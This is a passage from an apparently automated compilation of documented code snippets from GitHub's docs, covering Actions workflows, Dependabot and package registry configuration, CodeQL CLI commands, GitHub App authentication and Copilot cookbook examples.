all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n```\n```\n\n----------------------------------------\n\nTITLE: Example Workflow File\nDESCRIPTION: Shows a sample workflow file that checks out the repository and then uses a local action defined within the repository.  The `uses` keyword specifies the action to use, with `./.github/actions/hello-world-action` referencing the local action.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/section-referencing-an-action-from-the-same-repository.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  my_first_job:\n    runs-on: ubuntu-latest\n    steps:\n      # This step checks out a copy of your repository.\n      - name: My first step - check out repository\n        uses: {% data reusables.actions.action-checkout %}\n      # This step references the directory that contains the action.\n      - name: Use local hello-world-action\n        uses: ./.github/actions/hello-world-action\n```\n\n----------------------------------------\n\nTITLE: Installing and Setting Node.js Version with nodenv\nDESCRIPTION: This command installs a specific Node.js version using nodenv and sets it as the global default. It requires setting the `VERSION` variable based on the `engines.node` entry in `package.json`.\nSOURCE: https://github.com/github/docs/blob/main/contributing/node-versions.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n# Set VERSION= based on package.json#engines\nnodenv install $VERSION && nodenv global $VERSION\n```\n\n----------------------------------------\n\nTITLE: Configuring Amazon ECR Docker Registry\nDESCRIPTION: This snippet configures access to a private Amazon ECR registry using static AWS credentials stored as secrets. It uses the registry URL and sets `replaces-base` to `true`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  ecr-docker:\n    type: docker-registry\n    url: https://1234567890.dkr.ecr.us-east-1.amazonaws.com\n    username: ${{secrets.ECR_AWS_ACCESS_KEY_ID}}\n    password: ${{secrets.ECR_AWS_SECRET_ACCESS_KEY}}\n    replaces-base: true\n```\n\n----------------------------------------\n\nTITLE: Creating Nested Lists in Markdown\nDESCRIPTION: Illustrates how to create nested lists by indenting list items.  The example demonstrates a numbered list with nested bulleted lists at two levels. The proper indentation is crucial for rendering the nested structure correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_11\n\nLANGUAGE: markdown\nCODE:\n```\n1. First list item\n   - First nested list item\n     - Second nested list item\n```\n\nLANGUAGE: markdown\nCODE:\n```\n100. First list item\n     - First nested list item\n```\n\nLANGUAGE: markdown\nCODE:\n```\n100. First list item\n     - First nested list item\n       - Second nested list item\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Caching Syntax\nDESCRIPTION: This YAML snippet shows how to implement caching in GitHub Actions. It defines a job named `test_async` that utilizes the `actions/cache` action to cache node modules. The `path`, `key`, and `restore-keys` parameters are used to configure the cache.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  test_async:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Cache node modules\n      uses: {% data reusables.actions.action-cache %}\n      with:\n        path: ~/.npm\n        key: {% raw %}v1-npm-deps-${{ hashFiles('**/package-lock.json') }}{% endraw %}\n        restore-keys: v1-npm-deps-\n```\n\n----------------------------------------\n\nTITLE: Setting Image Source Label in Dockerfile\nDESCRIPTION: This snippet shows how to add a LABEL to a Dockerfile to specify the source repository of a container image. It is important for linking a container image to a repository within GitHub Packages.  The `OWNER` and `REPO` values must be replaced with your account and repository name. Depending on the version of GHES, the hostname may need to be replaced as well.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/connecting-a-repository-to-a-package.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nLABEL org.opencontainers.image.source=https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/OWNER/REPO\n```\n\n----------------------------------------\n\nTITLE: Configuring NuGet with PAT - Subdomain Isolation Enabled\nDESCRIPTION: This XML snippet demonstrates the configuration of a `nuget.config` file for authenticating with GitHub Packages using a Personal Access Token (PAT) when subdomain isolation is enabled. It specifies the GitHub Packages URL and credentials for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n    <packageSources>\n        <clear />\n        <add key=\"github\" value=\"https://{% ifversion fpt or ghec %}nuget.pkg.github.com{% else %}nuget.HOSTNAME{% endif %}/NAMESPACE/index.json\" />\n    </packageSources>\n    <packageSourceCredentials>\n        <github>\n            <add key=\"Username\" value=\"USERNAME\" />\n            <add key=\"ClearTextPassword\" value=\"TOKEN\" />\n        </github>\n    </packageSourceCredentials>\n</configuration>\n```\n\n----------------------------------------\n\nTITLE: Adding forwardPorts Property to devcontainer.json\nDESCRIPTION: This snippet demonstrates how to add the `forwardPorts` property to the `.devcontainer/devcontainer.json` file to automatically forward a specified port when a codespace is created. The `NUMBER` placeholder should be replaced with the desired port number or a comma-separated list of port numbers. After updating the file, existing codespaces need to be rebuilt for the changes to take effect.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/port-forwarding-adding.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n   \"forwardPorts\": [NUMBER],\n```\n\n----------------------------------------\n\nTITLE: Caching with Matrix Variables\nDESCRIPTION: This YAML snippet shows how to incorporate matrix variables into the cache key when using `actions/cache`. It includes the operating system and Ruby version in the key to create separate caches for each combination.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-cache %}\n  with:\n    path: vendor/bundle\n    key: {% raw %}bundle-use-ruby-${{ matrix.os }}-${{ matrix.ruby-version }}-${{ hashFiles('**/Gemfile.lock') }}{% endraw %}\n    restore-keys: |\n      {% raw %}bundle-use-ruby-${{ matrix.os }}-${{ matrix.ruby-version }}-{% endraw %}\n- name: Bundle install\n  run: |\n    bundle config path vendor/bundle\n    bundle install --jobs 4 --retry 3\n```\n\n----------------------------------------\n\nTITLE: Git Clone Output Example\nDESCRIPTION: This snippet shows example output from a `git clone` command. It details the process of cloning, including counting, compressing, and unpacking objects. This provides visual feedback to the user that the cloning process is underway and successful.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/committing-changes-to-a-pull-request-branch-created-from-a-fork.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git clone https://{% data variables.product.product_url %}/USERNAME/FORK-OF-THE-REPOSITORY\n> Cloning into `FORK-OF-THE-REPOSITORY`...\n> remote: Counting objects: 10, done.\n> remote: Compressing objects: 100% (8/8), done.\n> remove: Total 10 (delta 1), reused 10 (delta 1)\n> Unpacking objects: 100% (10/10), done.\n```\n\n----------------------------------------\n\nTITLE: Dynamic Concurrency Group Expression\nDESCRIPTION: This YAML snippet uses a dynamic expression to define the concurrency group. The group name is constructed as `ci-` followed by the Git ref.  This effectively creates a separate concurrency group for each branch or tag.  The `cancel-in-progress` option is set to `true`, ensuring new commits to a branch will cancel any existing in-progress runs for that branch.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-group-concurrency.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - main\n\nconcurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true\n```\n\n----------------------------------------\n\nTITLE: Reading Environment Variables in Ruby\nDESCRIPTION: This code reads environment variables containing the GitHub App's private key, webhook secret, and app identifier. The private key is used for JWT signing, the webhook secret for verifying webhook signatures, and the app identifier for authenticating as the GitHub App. Required dependencies: OpenSSL.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n# Expects the private key in PEM format. Converts the newlines.\nPRIVATE_KEY = OpenSSL::PKey::RSA.new(ENV['GITHUB_PRIVATE_KEY'].gsub('\\n', \"\\n\"))\n\n# Your registered app must have a webhook secret.\n# The secret is used to verify that webhooks are sent by GitHub.\nWEBHOOK_SECRET = ENV['GITHUB_WEBHOOK_SECRET']\n\n# The GitHub App's identifier (type integer).\nAPP_IDENTIFIER = ENV['GITHUB_APP_IDENTIFIER']\n```\n\n----------------------------------------\n\nTITLE: Finding All Organization Projects Node IDs (gh cli)\nDESCRIPTION: This snippet demonstrates how to find the node ID and title of all projects in an organization using the GitHub CLI with a GraphQL query. Replace `ORGANIZATION` with the organization name. It returns the first 20 projects. Authentication with `gh auth login --scopes \"project\"` or `gh auth login --scopes \"read:project\"` is required.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  query{\n    organization(login: \"ORGANIZATION\") {\n      projectsV2(first: 20) {\n        nodes {\n          id\n          title\n        }\n      }\n    }\n  }'\n```\n\n----------------------------------------\n\nTITLE: Polling User Events with ETag\nDESCRIPTION: This example demonstrates how to use `curl` to poll events for a specific user using the ETag header.  The first request retrieves the events and includes an ETag in the response. The second request includes the `If-None-Match` header with the ETag value. If no new events have occurred, the server will respond with a 304 status code.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/activity/events.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ curl -I {% data variables.product.rest_url %}/users/tater/events\n> HTTP/2 200\n> X-Poll-Interval: 60\n> ETag: \"a18c3bded88eb5dbb5c849a489412bf3\"\n\n# The quotes around the ETag value are important\n$ curl -I {% data variables.product.rest_url %}/users/tater/events \\\n$    -H 'If-None-Match: \"a18c3bded88eb5dbb5c849a489412bf3\"'\n> HTTP/2 304\n> X-Poll-Interval: 60\n```\n\n----------------------------------------\n\nTITLE: Updated CodeQL Workflow Steps (YAML)\nDESCRIPTION: This snippet shows the updated workflow steps, after removing the outdated git checkout command.  The workflow now checks out the repository and initializes the {% data variables.product.prodname_codeql %} tools, as these steps are sufficient for analyzing the merge commit.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/unnecessary-step-found.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n    steps:\n      - name: Checkout repository\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Initializes the {% data variables.product.prodname_codeql %} tools for scanning.\n      - name: Initialize {% data variables.product.prodname_codeql %}\n        uses: {% data reusables.actions.action-codeql-action-init %}\n\n      # ...\n```\n\n----------------------------------------\n\nTITLE: Handling the Callback URL in Ruby\nDESCRIPTION: This snippet defines a route handler for the application's callback URL. It extracts the `code` parameter from the request's query parameters, indicating that the user has authorized the application. This code parameter is then used to exchange it for a user access token (in subsequent steps).\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nget \"CALLBACK_URL\" do\n  code = params[\"code\"]\n  render = \"Successfully authorized! Got code #{code}.\"\n  erb render\nend\n```\n\n----------------------------------------\n\nTITLE: Checking CodeQL Database Availability with GitHub CLI\nDESCRIPTION: This snippet shows how to use the GitHub CLI (`gh api`) to check if CodeQL databases are available for a specific repository using the `/repos/<owner>/<repo>/code-scanning/codeql/databases` endpoint. The output provides information about available databases, including the language and last updated date. If no databases are available, the response will be empty.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/advanced-setup-of-the-codeql-cli.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh api /repos/<owner>/<repo>/code-scanning/codeql/databases\n```\n\n----------------------------------------\n\nTITLE: Displaying GHES License Information\nDESCRIPTION: This command displays information about the current GHES license. The `-j` flag can be used to format the output as JSON.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_84\n\nLANGUAGE: shell\nCODE:\n```\nghe-license info\n```\n\n----------------------------------------\n\nTITLE: Defining CodeQL Test Pack Dependencies and Tests (YAML)\nDESCRIPTION: This YAML snippet defines a CodeQL test pack. It specifies a dependency on another CodeQL pack (`my-github-user/my-custom-queries`) with a version constraint (greater than or equal to 1.2.3 and less than 2.0.0). It also configures the Java extractor for creating test databases and specifies that all `.ql` files in the pack's root directory should be treated as tests.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codeql-cli/test-qlpack.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: my-github-user/my-query-tests\ndependencies:\n  my-github-user/my-custom-queries: ^1.2.3\nextractor: java-kotlin\ntests: .\n```\n\n----------------------------------------\n\nTITLE: Deleting a Release using GitHub CLI\nDESCRIPTION: This snippet demonstrates how to delete a release using the `gh release delete` subcommand. It includes the `-y` flag to bypass the confirmation prompt. It requires the GitHub CLI to be installed and configured and specifies the tag of the release to be deleted.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/releasing-projects-on-github/managing-releases-in-a-repository.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh release delete TAG -y\n```\n\n----------------------------------------\n\nTITLE: Refactored JavaScript with Sales Calculation Function\nDESCRIPTION: This JavaScript code refactors the previous example by extracting the sales calculation into a function called `calculateSales`. This eliminates code repetition and makes the code more modular and readable.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nfunction calculateSales(price, quantity) {\n  return price * quantity;\n}\n\nlet totalSales = 0;\n\nlet applePrice = 3;\nlet applesSold = 100;\ntotalSales += calculateSales(applePrice, applesSold);\n\nlet orangePrice = 5;\nlet orangesSold = 50;\ntotalSales += calculateSales(orangePrice, orangesSold);\n\nconsole.log(`Total: ${totalSales}`);\n```\n\n----------------------------------------\n\nTITLE: Removing local container image with Docker CLI\nDESCRIPTION: This command removes a container image from the local Docker environment. Replace `NAMESPACE` with the name of the personal account or organization to which the image is scoped. This step is often performed before pulling an image by digest to ensure the latest version is obtained.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ndocker rmi {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:latest\n```\n\n----------------------------------------\n\nTITLE: Listing Available Feature Flags (Shell)\nDESCRIPTION: Demonstrates how to list available feature flags using the `list-features` command. This command provides information about each feature flag, including its status, description, and required GitHub Enterprise Server version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer list-features\n```\n\n----------------------------------------\n\nTITLE: Regular Expression for Vendored Dependency Directories\nDESCRIPTION: This regular expression identifies directories commonly used for vendored dependencies. Manifest files in these directories are ignored by the dependency graph to reduce noise and improve accuracy.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/troubleshooting-the-dependency-graph.md#_snippet_0\n\nLANGUAGE: regex\nCODE:\n```\n(3rd|[Tt]hird)[-_]?[Pp]arty/\n(^|/)vendors?/\n(^|/)[Ee]xtern(als?)?/\n(^|/)[Vv]+endor/\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering with AND for GHES range\nDESCRIPTION: This snippet checks if the GHES version is greater than the first deprecated version AND less than the second to last supported version and renders 'condition-h' if both conditions are true.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_5\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > __GHES_DEPRECATED__[0] and ghes < __GHES_SUPPORTED__[-2] %}\ncondition-h\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Running CodeQL Test Extract Command\nDESCRIPTION: This command builds a dataset for a test directory without executing test queries. It outputs the path to the raw QL dataset. The `--source-root` option allows specifying a different source code directory from the test directory.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/test-extract.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql test extract [--source-root=<dir>] <options>... -- <testDirectory>\n```\n\n----------------------------------------\n\nTITLE: Tagging container image - Docker CLI\nDESCRIPTION: This command tags an existing Docker image with a new name and destination in the GitHub Container Registry. It requires the IMAGE ID of the existing image. Replace `NAMESPACE` and `NEW_IMAGE_NAME` with the desired namespace and image name, respectively, and `38f737a91f39` with the actual Image ID.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ndocker tag 38f737a91f39 {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/NEW_IMAGE_NAME:latest\n```\n\n----------------------------------------\n\nTITLE: React Form Prompt File Example\nDESCRIPTION: This prompt file demonstrates how to create a reusable task to generate a form using React. It includes instructions on using a design system, react-hook-form for state management, and yup for validation.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/customizing-copilot/adding-repository-custom-instructions-for-github-copilot.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nYour goal is to generate a new React form component.\n\nAsk for the form name and fields if not provided.\n\nRequirements for the form:\n- Use form design system components: [design-system/Form.md](../docs/design-system/Form.md)\n- Use `react-hook-form` for form state management:\n  - Always define TypeScript types for your form data\n  - Prefer *uncontrolled* components using register\n  - Use `defaultValues` to prevent unnecessary rerenders\n- Use `yup` for validation:\n  - Create reusable validation schemas in separate files\n  - Use TypeScript types to ensure type safety\n  - Customize UX-friendly validation rules\n```\n\n----------------------------------------\n\nTITLE: Configuring Python Index with Username and Password\nDESCRIPTION: This snippet configures access to a Python index using a username and password. It sets `replaces-base` to `true`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_16\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  python-example:\n    type: python-index\n    url: https://example.com/_packaging/my-feed/pypi/example\n    username: octocat\n    password: ${{secrets.MY_BASIC_AUTH_PASSWORD}}\n    replaces-base: true\n```\n\n----------------------------------------\n\nTITLE: Using an Intermediate Environment Variable - YAML\nDESCRIPTION: This YAML snippet shows how to use an intermediate environment variable to handle untrusted input in inline scripts. The expression's value is set to an environment variable, preventing direct interaction with the script generation process. This mitigates script injection attacks.\nSOURCE: https://github.com/github/docs/blob/main/content/enterprise-onboarding/github-actions-for-your-enterprise/security-hardening-for-github-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n      - name: Check PR title\n        env:\n          TITLE: {% raw %}${{ github.event.pull_request.title }}{% endraw %}\n        run: |\n          if [[ \"$TITLE\" =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi\n```\n\n----------------------------------------\n\nTITLE: Initializing Octokit App with App ID and Private Key\nDESCRIPTION: This code snippet demonstrates how to initialize an Octokit App instance with an App ID and a private key.  It imports the `App` class from the `octokit` library and creates a new instance. Replace `APP_ID` and `PRIVATE_KEY` with the actual app ID and private key, respectively. This setup is required to authenticate as a GitHub App installation using Octokit.js.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport { App } from \"octokit\";\n\nconst app = new App({\n  appId: APP_ID,\n  privateKey: PRIVATE_KEY,\n});\n```\n\n----------------------------------------\n\nTITLE: Finalize CodeQL database\nDESCRIPTION: This command finalizes a CodeQL database after initialization and data population. It's a crucial step to prepare the database for querying. It requires the path to the database that was initialized with `codeql database init`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-finalize.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database finalize [--dbscheme=<file>] [--threads=<num>] [--ram=<MB>] <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Setting User-Agent Header Example\nDESCRIPTION: This example shows how to set the `User-Agent` header in a request. It's recommended to use your GitHub username or application name for the header value, allowing GitHub to contact you if issues arise. A valid `User-Agent` header is required for all API requests, and invalid headers will result in a `403 Forbidden` response.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nUser-Agent: Awesome-Octocat-App\n```\n\n----------------------------------------\n\nTITLE: Wrapping Factorial Calculation in a Function in Python\nDESCRIPTION: This snippet defines a function called `calculate_factorial` that takes a number as input and returns its factorial. It initializes the factorial to 1, loops from 1 to the input number, multiplying the factorial by each number, and then returns the factorial.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/reusing-other-peoples-code-in-your-projects.md#_snippet_1\n\nLANGUAGE: Python\nCODE:\n```\ndef calculate_factorial(number):\n    # Initialize the factorial result to 1\n    factorial = 1\n\n    # Loop from 1 to number (inclusive) and multiply factorial by each number\n    for i in range(1, number + 1):\n        factorial *= i\n\n    return factorial\n```\n\n----------------------------------------\n\nTITLE: Audit CircleCI using config file\nDESCRIPTION: This command audits a CircleCI instance using a specified YAML configuration file. It requires the `gh actions-importer` tool and a correctly formatted config file. The results of the audit are saved in the specified output directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer audit circle-ci --output-dir ./output/ --config-file-path ./path/to/circle-ci/config.yml\n```\n\n----------------------------------------\n\nTITLE: COBOL Database Record Insertion\nDESCRIPTION: This COBOL code snippet connects to a database and inserts a record into the 'persons' table.  It includes basic error handling with transaction management (COMMIT and ROLLBACK).  The code uses embedded SQL statements to interact with the database. It takes `LS-PERSON-RECORD` as input via the `LINKAGE SECTION`.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/documenting-code/documenting-legacy-code.md#_snippet_0\n\nLANGUAGE: cobol\nCODE:\n```\nIDENTIFICATION DIVISION.\nPROGRAM-ID. INSERT-RECORD.\n\nENVIRONMENT DIVISION.\n\nDATA DIVISION.\nWORKING-STORAGE SECTION.\n01  WS-STATUS-FLAGS.\n    05 WS-DB-STATUS     PIC X(2).\n       88 WS-SUCCESS    VALUE \"00\".\n    05 WS-SQLCODE       PIC S9(9) COMP.\n    05 WS-ERROR-MSG     PIC X(50).\n\nLINKAGE SECTION.\n01  LS-PARAMETERS.\n    05 LS-PERSON-RECORD.\n       10 PERSON-ID     PIC 9(6).\n       10 PERSON-NAME   PIC X(50).\n       10 PERSON-AGE    PIC 9(3).\n    05 LS-RESULT        PIC X.\n       88 SUCCESS       VALUE 'T'.\n       88 FAILED        VALUE 'F'.\n\nPROCEDURE DIVISION USING LS-PARAMETERS.\n    PERFORM INSERT-AND-VALIDATE\n    GOBACK\n    .\n\nINSERT-AND-VALIDATE.\n    EXEC SQL\n        INSERT INTO persons (id, name, age)\n        VALUES (:PERSON-ID, :PERSON-NAME, :PERSON-AGE)\n    END-EXEC\n\n    IF SQLCODE = 0\n        EXEC SQL COMMIT END-EXEC\n        SET SUCCESS TO TRUE\n    ELSE\n        EXEC SQL ROLLBACK END-EXEC\n        SET FAILED TO TRUE\n        STRING \"DB Error: \" SQLCODE\n            DELIMITED BY SIZE\n            INTO WS-ERROR-MSG\n        DISPLAY WS-ERROR-MSG\n    END-IF\n    .\n```\n\n----------------------------------------\n\nTITLE: Combining Runner Group and Labels in GitHub Actions YAML\nDESCRIPTION: This YAML snippet demonstrates how to use the `runs-on` key to combine a runner group (`ubuntu-runners`) and a label (`ubuntu-20.04-16core`).  The job will be routed to an available runner within the specified group that also has the matching label. It includes steps to check out the repository, set up Node.js, install bats, and execute bats tests.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/example-runs-on-labels-and-groups.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      group: ubuntu-runners\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n----------------------------------------\n\nTITLE: Defining Workflow Jobs\nDESCRIPTION: This snippet defines the `build` job that runs on `ubuntu-latest`. It sets permissions required for the workflow, including `security-events: write`, `actions: read`, and `contents: read`. These permissions are necessary for uploading SARIF results and checking out the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/uploading-a-sarif-file-to-github.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      # required for all workflows\n      security-events: write\n      # only required for workflows in private repositories\n      actions: read\n      contents: read\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n```\n\n----------------------------------------\n\nTITLE: Revoke Migrator Role Mutation\nDESCRIPTION: This GraphQL mutation revokes the migrator role from a specified user or team within an organization. It requires the organization ID, the actor (username or team name), and the actor type (USER or TEAM). A {% data variables.product.pat_generic %} (PAT) with appropriate scopes is required to execute this mutation.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/grant-migrator-role-graphql.md#_snippet_1\n\nLANGUAGE: GraphQL\nCODE:\n```\nmutation revokeMigratorRole (\n  $organizationId: ID!,\n  $actor: String!,\n  $actor_type: ActorType!\n) {\n  revokeMigratorRole( input: {\n    organizationId: $organizationId,\n    actor: $actor,\n    actorType: $actor_type\n  })\n   { success }\n}\n```\n\n----------------------------------------\n\nTITLE: Bash Script Example (With Hash-bang)\nDESCRIPTION: This bash script snippet includes a hash-bang at the beginning. It tests how the system handles code blocks that start with a shebang (`#!/usr/bin/env bash`) followed by an if statement that checks if a variable `file` is empty. If `file` is empty, it echoes `cat`. This is used to prevent errors in parsing code snippets with hashbangs.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/foo/code-snippet-with-hashbang.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n# Has to start with a comment.\n#!/usr/bin/env bash\n\n# This is the if statement\nif [ -z $file ]; then\n  echo cat\nfi\n```\n\n----------------------------------------\n\nTITLE: Simulating Blocking Transaction in SQL\nDESCRIPTION: This SQL snippet simulates a blocking transaction that could lead to deadlocks. It updates a row, waits for 5 seconds, and then updates another row, holding locks for an extended period.  It demonstrates a scenario where simultaneous updates on interdependent rows can cause issues. Dependencies: SQL Server (or any SQL database supporting WAITFOR DELAY).\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/fixing-database-deadlocks-or-data-integrity-issues.md#_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nBEGIN TRANSACTION;\nUPDATE my_table SET value = 'Some value' WHERE id = 301;\n-- Simulate a process taking 5 seconds:\nWAITFOR DELAY '00:00:05';\nUPDATE my_table SET value = 'Another value' WHERE id = 127;\nCOMMIT TRANSACTION;\n```\n\n----------------------------------------\n\nTITLE: Checking Cluster Status with ghe-cluster-status\nDESCRIPTION: This snippet demonstrates how to use the `ghe-cluster-status` command-line utility to check the health of a GitHub Enterprise Server cluster. It filters the output to display only failing tests using `grep error`. The absence of output indicates a healthy cluster.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nadmin@ghe-data-node-0:~$ ghe-cluster-status | grep error\n> mysql-replication ghe-data-node-0: error Stopped\n> mysql cluster: error\n```\n\n----------------------------------------\n\nTITLE: Defining a simple GitHub CLI extension in Go\nDESCRIPTION: This Go code defines a basic GitHub CLI extension that uses the `go-gh` library to fetch the user's login and name via the GitHub API. It imports the necessary packages, constructs an API call, executes it, and prints the result to standard output. Error handling is included.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_12\n\nLANGUAGE: Go\nCODE:\n```\npackage main\nimport (\n  \"github.com/cli/go-gh\"\n  \"fmt\"\n)\n\nfunc main() {\n  args := []string{\"api\", \"user\", \"--jq\", `\"You are @\\(.login) (\\(.name))\"` }\n  stdOut, _, err := gh.Exec(args...)\n  if err != nil {\n    fmt.Println(err)\n    return\n  }\n  